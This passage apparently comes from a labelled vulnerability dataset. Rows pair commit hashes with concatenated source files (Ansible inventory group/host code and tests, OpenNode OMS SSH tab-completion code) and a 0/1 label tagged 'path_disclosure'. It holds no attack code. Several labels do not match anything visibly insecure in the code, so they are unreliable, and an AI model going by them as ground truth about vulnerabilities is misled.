            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

from ansible.compat.tests import unittest

from ansible.inventory.group import Group
from ansible.inventory.host import Host
from ansible.errors import AnsibleError


class TestGroup(unittest.TestCase):

    def test_depth_update(self):
        A = Group('A')
        B = Group('B')
        Z = Group('Z')
        A.add_child_group(B)
        A.add_child_group(Z)
        self.assertEqual(A.depth, 0)
        self.assertEqual(Z.depth, 1)
        self.assertEqual(B.depth, 1)

    def test_depth_update_dual_branches(self):
        alpha = Group('alpha')
        A = Group('A')
        alpha.add_child_group(A)
        B = Group('B')
        A.add_child_group(B)
        Z = Group('Z')
        alpha.add_child_group(Z)
        beta = Group('beta')
        B.add_child_group(beta)
        Z.add_child_group(beta)

        self.assertEqual(alpha.depth, 0)  # apex
        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta

        omega = Group('omega')
        omega.add_child_group(alpha)

        # verify that both paths are traversed to get the max depth value
        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B
        self.assertEqual(beta.depth, 4)  # B -> beta

    def test_depth_recursion(self):
        A = Group('A')
        B = Group('B')
        A.add_child_group(B)
        # hypothetical of adding B as child group to A
        A.parent_groups.append(B)
        B.child_groups.append(A)
        # can't update depths of groups, because of loop
        with self.assertRaises(AnsibleError):
            B._check_children_depth()

    def test_loop_detection(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        A.add_child_group(B)
        B.add_child_group(C)
        with self.assertRaises(AnsibleError):
            C.add_child_group(A)

    def test_populates_descendant_hosts(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        h = Host('h')
        C.add_host(h)
        A.add_child_group(B)  # B is child of A
        B.add_child_group(C)  # C is descendant of A
        A.add_child_group(B)
        self.assertEqual(set(h.groups), set([C, B, A]))
        h2 = Host('h2')
        C.add_host(h2)
        self.assertEqual(set(h2.groups), set([C, B, A]))

    def test_ancestor_example(self):
        # see docstring for Group._walk_relationship
        groups = {}
        for name in ['A', 'B', 'C', 'D', 'E', 'F']:
            groups[name] = Group(name)
        # first row
        groups['A'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['E'])
        groups['C'].add_child_group(groups['D'])
        # second row
        groups['D'].add_child_group(groups['E'])
        groups['D'].add_child_group(groups['F'])
        groups['E'].add_child_group(groups['F'])

        self.assertEqual(
            set(groups['F'].get_ancestors()),
            set([
                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']
            ])
        )

    def test_ancestors_recursive_loop_safe(self):
        '''
        The get_ancestors method may be referenced before circular parenting
        checks, so the method is expected to be stable even with loops
        '''
        A = Group('A')
        B = Group('B')
        A.parent_groups.append(B)
        B.parent_groups.append(A)
        # finishes in finite time
        self.assertEqual(A.get_ancestors(), set([A, B]))
/n/n/n",0,path_disclosure
29,37,153c9bd539eeffdd6d395b8840f95d56e3814f27,"/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:
            for group in self.child_groups:
                group.depth = max([self.depth + 1, group.depth])
                group._check_children_depth()
        except RuntimeError:
            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:
            g.clear_hosts_cache()

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:
            kid_hosts = kid.get_hosts()
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):

        results = {}
        for g in self.parent_groups:
            results[g.name] = g
            results.update(g._get_ancestors())
        return results

    def get_ancestors(self):

        return self._get_ancestors().values()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):
        # populate ancestors
        for group in self.groups:
            self.add_group(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/n",1,path_disclosure
30,164,0a87ba7972cdcab6ce77568e8d0eb8474132315d,"opennode/oms/endpoint/ssh/completion_cmds.py/n/nfrom grokcore.component import baseclass, context
from zope.component import provideSubscriptionAdapter
import argparse
import os

from opennode.oms.endpoint.ssh import cmd
from opennode.oms.endpoint.ssh.completion import Completer
from opennode.oms.endpoint.ssh.cmdline import GroupDictAction
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model import creatable_models
from opennode.oms.zodb import db


class CommandCompleter(Completer):
    """"""Completes a command.""""""

    context(cmd.NoCommand)

    def complete(self, token, parsed, parser):
        return [name for name in cmd.commands().keys() if name.startswith(token)]


class PathCompleter(Completer):
    """"""Completes a path name.""""""
    baseclass()

    @db.transact
    def complete(self, token, parsed, parser):
        if not self.consumed(parsed, parser):
            base_path = os.path.dirname(token)
            container = self.context.traverse(base_path)

            if IContainer.providedBy(container):
                def dir_suffix(obj):
                    return '/' if IContainer.providedBy(obj) else ''

                def name(obj):
                    return os.path.join(base_path, obj.__name__)

                return [name(obj) + dir_suffix(obj) for obj in container.listcontent() if name(obj).startswith(token)]


        return []

    def consumed(self, parsed, parser):
        """"""Check whether we have already consumed all positional arguments.""""""

        maximum = 0
        actual = 0
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                # For every positional argument:
                if not action.option_strings:
                    # Count how many of them we have already.
                    values = getattr(parsed, action.dest, [])
                    if values == action.default:  # don't count default values
                        values = []
                    if not isinstance(values, list):
                        values = [values]
                    actual += len(values)

                    # And the maximum number of expected occurencies.
                    if isinstance(action.nargs, int):
                        maximum += action.nargs
                    if action.nargs == argparse.OPTIONAL:
                        maximum += 1
                    else:
                        maximum = float('inf')

        return actual >= maximum


class ArgSwitchCompleter(Completer):
    """"""Completes argument switches based on the argparse grammar exposed for a command""""""
    baseclass()

    def complete(self, token, parsed, parser):
        if token.startswith(""-""):
            parser = self.context.arg_parser(partial=True)

            options = [option
                       for action_group in parser._action_groups
                       for action in action_group._group_actions
                       for option in action.option_strings
                       if option.startswith(token) and not self.option_consumed(action, parsed)]
            return options
        else:
            return []

    def option_consumed(self, action, parsed):
        # ""count"" actions can be repeated
        if action.nargs > 0 or isinstance(action, argparse._CountAction):
            return False

        if isinstance(action, GroupDictAction):
            value = getattr(parsed, action.group, {}).get(action.dest, action.default)
        else:
            value = getattr(parsed, action.dest, action.default)

        return value != action.default

class KeywordSwitchCompleter(ArgSwitchCompleter):
    """"""Completes key=value argument switches based on the argparse grammar exposed for a command.
    TODO: probably more can be shared with ArgSwitchCompleter.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        options = [option[1:] + '='
                   for action_group in parser._action_groups
                   for action in action_group._group_actions
                   for option in action.option_strings
                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]
        return options


class KeywordValueCompleter(ArgSwitchCompleter):
    """"""Completes the `value` part of key=value constructs based on the type of the keyword.
    Currently works only for args which declare an explicit enumeration.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        if '=' in token:
            keyword, value_prefix = token.split('=')

            action = self.find_action(keyword, parsed, parser)
            if action.choices:
                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]

        return []

    def find_action(self, keyword, parsed, parser):
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                if action.dest == keyword:
                    return action


class ObjectTypeCompleter(Completer):
    """"""Completes object type names.""""""

    context(cmd.cmd_mk)

    def complete(self, token):
        return [name for name in creatable_models.keys() if name.startswith(token)]


# TODO: move to handler
for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:
    provideSubscriptionAdapter(PathCompleter, adapts=[command])

for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:
    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])
/n/n/nopennode/oms/endpoint/ssh/protocol.py/n/nimport os

from columnize import columnize
from twisted.internet import defer

from opennode.oms.endpoint.ssh import cmd, completion, cmdline
from opennode.oms.endpoint.ssh.terminal import InteractiveTerminal
from opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError
from opennode.oms.zodb import db


class OmsSshProtocol(InteractiveTerminal):
    """"""The OMS virtual console over SSH.

    Accepts lines of input and writes them back to its connection.  If
    a line consisting solely of ""quit"" is received, the connection
    is dropped.

    """"""

    def __init__(self):
        super(OmsSshProtocol, self).__init__()
        self.path = ['']

        @defer.inlineCallbacks
        def _get_obj_path():
            # Here, we simply hope that self.obj_path won't actually be
            # used until it's initialised.  A more fool-proof solution
            # would be to block everything in the protocol while the ZODB
            # query is processing, but that would require a more complex
            # workaround.  This will not be a problem during testing as
            # DB access is blocking when testing.
            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()

        _get_obj_path()

        self.tokenizer = CommandLineTokenizer()

    def lineReceived(self, line):
        line = line.strip()

        try:
            command, cmd_args = self.parse_line(line)
        except CommandLineSyntaxError as e:
            self.terminal.write(""Syntax error: %s\n"" % (e.message))
            self.print_prompt()
            return

        deferred = defer.maybeDeferred(command, *cmd_args)

        @deferred
        def on_success(ret):
            self.print_prompt()

        @deferred
        def on_error(f):
            if not f.check(cmdline.ArgumentParsingError):
                f.raiseException()
            self.print_prompt()

        ret = defer.Deferred()
        deferred.addBoth(ret.callback)
        return ret

    def print_prompt(self):
        self.terminal.write(self.ps[self.pn])

    def insert_buffer(self, buf):
        """"""Inserts some chars in the buffer at the current cursor position.""""""
        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]
        self.lineBuffer = lead + buf + rest
        self.lineBufferIndex += len(buf)

    def insert_text(self, text):
        """"""Inserts some text at the current cursor position and renders it.""""""
        self.terminal.write(text)
        self.insert_buffer(list(text))

    def parse_line(self, line):
        """"""Returns a command instance and parsed cmdline argument list.

        TODO: Shell expansion should be handled here.

        """"""

        cmd_name, cmd_args = line.partition(' ')[::2]
        command_cls = cmd.get_command(cmd_name)

        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())

        return command_cls(self), tokenized_cmd_args

    @defer.inlineCallbacks
    def handle_TAB(self):
        """"""Handles tab completion.""""""
        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)

        if len(completions) == 1:
            space = '' if rest else ' '
            # handle quote closing
            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '""':
                space = '"" '
            # Avoid space after '=' just for aestetics.
            # Avoid space after '/' for functionality.
            for i in ('=', '/'):
                if completions[0].endswith(i):
                    space = ''

            patch = completions[0][len(partial):] + space
            self.insert_text(patch)
        elif len(completions) > 1:
            common_prefix = os.path.commonprefix(completions)
            patch = common_prefix[len(partial):]
            self.insert_text(patch)

            # postpone showing list of possible completions until next tab
            if not patch:
                self.terminal.nextLine()
                self.terminal.write(columnize(completions))
                self.drawInputLine()
                if len(rest):
                    self.terminal.cursorBackward(len(rest))


    @property
    def hist_file_name(self):
        return os.path.expanduser('~/.oms_history')

    @property
    def ps(self):
        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')
        return [ps1, '... ']

    def _cwd(self):
        return self.make_path(self.path)

    @staticmethod
    def make_path(path):
        return '/'.join(path) or '/'
/n/n/nopennode/oms/tests/test_completion.py/n/nimport unittest

import mock
from nose.tools import eq_

from opennode.oms.endpoint.ssh.protocol import OmsSshProtocol
from opennode.oms.endpoint.ssh import cmd


class CmdCompletionTestCase(unittest.TestCase):

    def setUp(self):
        self.oms_ssh = OmsSshProtocol()
        self.terminal = mock.Mock()
        self.oms_ssh.terminal = self.terminal

        self.oms_ssh.connectionMade()

        # the standard model doesn't have any command or path which
        # is a prefix of another (len > 1), I don't want to force changes
        # to the model just for testing completion, so we have monkey patch
        # the commands() function and add a command 'hello'.
        self.orig_commands = cmd.commands
        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())

    def tearDown(self):
        cmd.commands = self.orig_commands

    def _input(self, string):
        for s in string:
            self.oms_ssh.characterReceived(s, False)

    def _tab_after(self, string):
        self._input(string)
        self.terminal.reset_mock()

        self.oms_ssh.handle_TAB()

    def test_command_completion(self):
        self._tab_after('s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_command_completion_spaces(self):
        self._tab_after('    s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_complete_not_found(self):
        self._tab_after('t')
        eq_(len(self.terminal.method_calls), 0)

    def test_complete_quotes(self):
        self._tab_after('ls ""comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_complete_prefix(self):
        self._tab_after('h')
        eq_(self.terminal.method_calls, [('write', ('el',), {})])

        # hit tab twice
        self.terminal.reset_mock()
        self.oms_ssh.handle_TAB()

        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])

    def test_spaces_between_arg(self):
        self._tab_after('ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_command_arg_spaces_before_command(self):
        self._tab_after(' ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_mandatory_positional(self):
        self._tab_after('cat ')
        eq_(len(self.terminal.method_calls), 4)

    def test_complete_switches(self):
        self._tab_after('quit ')
        eq_(len(self.terminal.method_calls), 0)

        # hit tab twice
        self.oms_ssh.handle_TAB()
        eq_(len(self.terminal.method_calls), 0)

        # now try with a dash
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])
        # disambiguate
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('help ',), {})])

    def test_complete_consumed_switches(self):
        self._tab_after('ls --help')
        eq_(self.terminal.method_calls, [('write', (' ',), {})])

        self._tab_after('-')
        assert 'help' not in self.terminal.method_calls[2][1][0]
        assert '-h' not in self.terminal.method_calls[2][1][0]
/n/n/n",0,path_disclosure
31,165,0a87ba7972cdcab6ce77568e8d0eb8474132315d,"/opennode/oms/endpoint/ssh/completion_cmds.py/n/nfrom grokcore.component import baseclass, context
from zope.component import provideSubscriptionAdapter
import argparse

from opennode.oms.endpoint.ssh import cmd
from opennode.oms.endpoint.ssh.completion import Completer
from opennode.oms.endpoint.ssh.cmdline import GroupDictAction
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model import creatable_models
from opennode.oms.zodb import db


class CommandCompleter(Completer):
    """"""Completes a command.""""""

    context(cmd.NoCommand)

    def complete(self, token, parsed, parser):
        return [name for name in cmd.commands().keys() if name.startswith(token)]


class PathCompleter(Completer):
    """"""Completes a path name.""""""
    baseclass()

    @db.transact
    def complete(self, token, parsed, parser):

        if not self.consumed(parsed, parser):
            obj = self.context.current_obj
            if IContainer.providedBy(obj):
                return [name for name in obj.listnames() if name.startswith(token)]

        return []

    def consumed(self, parsed, parser):
        """"""Check whether we have already consumed all positional arguments.""""""

        maximum = 0
        actual = 0
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                # For every positional argument:
                if not action.option_strings:
                    # Count how many of them we have already.
                    values = getattr(parsed, action.dest, [])
                    if values == action.default:  # don't count default values
                        values = []
                    if not isinstance(values, list):
                        values = [values]
                    actual += len(values)

                    # And the maximum number of expected occurencies.
                    if isinstance(action.nargs, int):
                        maximum += action.nargs
                    if action.nargs == argparse.OPTIONAL:
                        maximum += 1
                    else:
                        maximum = float('inf')

        return actual >= maximum


class ArgSwitchCompleter(Completer):
    """"""Completes argument switches based on the argparse grammar exposed for a command""""""
    baseclass()

    def complete(self, token, parsed, parser):
        if token.startswith(""-""):
            parser = self.context.arg_parser(partial=True)

            options = [option
                       for action_group in parser._action_groups
                       for action in action_group._group_actions
                       for option in action.option_strings
                       if option.startswith(token) and not self.option_consumed(action, parsed)]
            return options
        else:
            return []

    def option_consumed(self, action, parsed):
        # ""count"" actions can be repeated
        if action.nargs > 0 or isinstance(action, argparse._CountAction):
            return False

        if isinstance(action, GroupDictAction):
            value = getattr(parsed, action.group, {}).get(action.dest, action.default)
        else:
            value = getattr(parsed, action.dest, action.default)

        return value != action.default

class KeywordSwitchCompleter(ArgSwitchCompleter):
    """"""Completes key=value argument switches based on the argparse grammar exposed for a command.
    TODO: probably more can be shared with ArgSwitchCompleter.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        options = [option[1:] + '='
                   for action_group in parser._action_groups
                   for action in action_group._group_actions
                   for option in action.option_strings
                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]
        return options


class KeywordValueCompleter(ArgSwitchCompleter):
    """"""Completes the `value` part of key=value constructs based on the type of the keyword.
    Currently works only for args which declare an explicit enumeration.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        if '=' in token:
            keyword, value_prefix = token.split('=')

            action = self.find_action(keyword, parsed, parser)
            if action.choices:
                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]

        return []

    def find_action(self, keyword, parsed, parser):
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                if action.dest == keyword:
                    return action


class ObjectTypeCompleter(Completer):
    """"""Completes object type names.""""""

    context(cmd.cmd_mk)

    def complete(self, token):
        return [name for name in creatable_models.keys() if name.startswith(token)]


# TODO: move to handler
for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:
    provideSubscriptionAdapter(PathCompleter, adapts=[command])

for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:
    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])
/n/n/n/opennode/oms/endpoint/ssh/protocol.py/n/nimport os

from columnize import columnize
from twisted.internet import defer

from opennode.oms.endpoint.ssh import cmd, completion, cmdline
from opennode.oms.endpoint.ssh.terminal import InteractiveTerminal
from opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError
from opennode.oms.zodb import db


class OmsSshProtocol(InteractiveTerminal):
    """"""The OMS virtual console over SSH.

    Accepts lines of input and writes them back to its connection.  If
    a line consisting solely of ""quit"" is received, the connection
    is dropped.

    """"""

    def __init__(self):
        super(OmsSshProtocol, self).__init__()
        self.path = ['']

        @defer.inlineCallbacks
        def _get_obj_path():
            # Here, we simply hope that self.obj_path won't actually be
            # used until it's initialised.  A more fool-proof solution
            # would be to block everything in the protocol while the ZODB
            # query is processing, but that would require a more complex
            # workaround.  This will not be a problem during testing as
            # DB access is blocking when testing.
            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()

        _get_obj_path()

        self.tokenizer = CommandLineTokenizer()

    def lineReceived(self, line):
        line = line.strip()

        try:
            command, cmd_args = self.parse_line(line)
        except CommandLineSyntaxError as e:
            self.terminal.write(""Syntax error: %s\n"" % (e.message))
            self.print_prompt()
            return

        deferred = defer.maybeDeferred(command, *cmd_args)

        @deferred
        def on_success(ret):
            self.print_prompt()

        @deferred
        def on_error(f):
            if not f.check(cmdline.ArgumentParsingError):
                f.raiseException()
            self.print_prompt()

        ret = defer.Deferred()
        deferred.addBoth(ret.callback)
        return ret

    def print_prompt(self):
        self.terminal.write(self.ps[self.pn])

    def insert_buffer(self, buf):
        """"""Inserts some chars in the buffer at the current cursor position.""""""
        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]
        self.lineBuffer = lead + buf + rest
        self.lineBufferIndex += len(buf)

    def insert_text(self, text):
        """"""Inserts some text at the current cursor position and renders it.""""""
        self.terminal.write(text)
        self.insert_buffer(list(text))

    def parse_line(self, line):
        """"""Returns a command instance and parsed cmdline argument list.

        TODO: Shell expansion should be handled here.

        """"""

        cmd_name, cmd_args = line.partition(' ')[::2]
        command_cls = cmd.get_command(cmd_name)

        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())

        return command_cls(self), tokenized_cmd_args

    @defer.inlineCallbacks
    def handle_TAB(self):
        """"""Handles tab completion.""""""
        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)

        if len(completions) == 1:
            space = '' if rest else ' '
            # handle quote closing
            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '""':
                space = '"" '
            # Avoid space after '=' just for aestetics.
            if completions[0].endswith('='):
                space = ''

            patch = completions[0][len(partial):] + space
            self.insert_text(patch)
        elif len(completions) > 1:
            common_prefix = os.path.commonprefix(completions)
            patch = common_prefix[len(partial):]
            self.insert_text(patch)

            # postpone showing list of possible completions until next tab
            if not patch:
                self.terminal.nextLine()
                self.terminal.write(columnize(completions))
                self.drawInputLine()
                if len(rest):
                    self.terminal.cursorBackward(len(rest))


    @property
    def hist_file_name(self):
        return os.path.expanduser('~/.oms_history')

    @property
    def ps(self):
        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')
        return [ps1, '... ']

    def _cwd(self):
        return self.make_path(self.path)

    @staticmethod
    def make_path(path):
        return '/'.join(path) or '/'
/n/n/n/opennode/oms/tests/test_completion.py/n/nimport unittest

import mock
from nose.tools import eq_

from opennode.oms.endpoint.ssh.protocol import OmsSshProtocol
from opennode.oms.endpoint.ssh import cmd


class CmdCompletionTestCase(unittest.TestCase):

    def setUp(self):
        self.oms_ssh = OmsSshProtocol()
        self.terminal = mock.Mock()
        self.oms_ssh.terminal = self.terminal

        self.oms_ssh.connectionMade()

        # the standard model doesn't have any command or path which
        # is a prefix of another (len > 1), I don't want to force changes
        # to the model just for testing completion, so we have monkey patch
        # the commands() function and add a command 'hello'.
        self.orig_commands = cmd.commands
        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())

    def tearDown(self):
        cmd.commands = self.orig_commands

    def _input(self, string):
        for s in string:
            self.oms_ssh.characterReceived(s, False)

    def _tab_after(self, string):
        self._input(string)
        self.terminal.reset_mock()

        self.oms_ssh.handle_TAB()

    def test_command_completion(self):
        self._tab_after('s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_command_completion_spaces(self):
        self._tab_after('    s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_complete_not_found(self):
        self._tab_after('t')
        eq_(len(self.terminal.method_calls), 0)

    def test_complete_quotes(self):
        self._tab_after('ls ""comp')
        eq_(self.terminal.method_calls, [('write', ('utes"" ',), {})])

    def test_complete_prefix(self):
        self._tab_after('h')
        eq_(self.terminal.method_calls, [('write', ('el',), {})])

        # hit tab twice
